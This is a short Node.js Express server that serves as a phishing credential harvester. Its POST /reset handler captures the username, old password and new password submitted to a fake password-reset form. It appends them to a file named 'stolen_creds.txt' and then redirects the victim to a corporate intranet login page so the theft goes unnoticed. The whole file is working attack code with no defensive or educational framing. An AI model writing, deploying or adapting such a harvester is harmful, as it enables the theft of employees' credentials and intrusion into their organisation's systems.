const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.urlencoded({ extended: true }));
app.post('/reset', (req, res) => {
  const creds = `User: ${req.body.username} OldPwd: ${req.body.old_password} NewPwd: ${req.body.new_password}\n`;
  fs.appendFile('stolen_creds.txt', creds, err => {});
  res.redirect('https://intranet.corp.example.com/login');
});
app.listen(80);
